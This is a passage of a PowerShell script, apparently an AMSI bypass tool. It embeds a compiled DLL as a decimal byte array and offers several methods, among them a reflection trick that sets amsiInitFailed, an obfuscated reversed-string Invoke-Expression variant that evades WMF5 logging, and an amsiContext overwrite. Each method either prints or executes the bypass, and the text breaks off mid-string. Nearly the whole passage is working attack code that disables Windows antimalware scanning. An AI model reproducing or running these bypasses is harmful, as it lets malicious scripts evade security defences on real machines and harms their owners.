137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\nif (([IntPtr]::Size) -eq 8)\n{\nWrite-Verbose \"64 bit process detected.\"\n$DllBytes = $AmsiX64\n}\nelseif (([IntPtr]::Size) -eq 4)\n{\nWrite-Verbose \"32 bit process detected.\"\n$DllBytes = $AmsiX86\n}\nswitch($method)\n{\n\"unload\"\n{\nWrite-Verbose \"Using Matt Graeber's Reflection method.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n}\n}\n\"unloadsilent\"\n{\nWrite-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)\n}\n}\n\"unloadobfuscated\"\n{\nWrite-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\"\nif ($ShowOnly -eq $True)\n{\n$code = @\" \nSv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n\"@\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output $code\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\nSv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n}\n}\n\"unload2\"\n{\nWrite-Verbose \"Using Matt Graeber's second Reflection method.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'\n}\nelse\n{\nWrite-Output \"Executing the 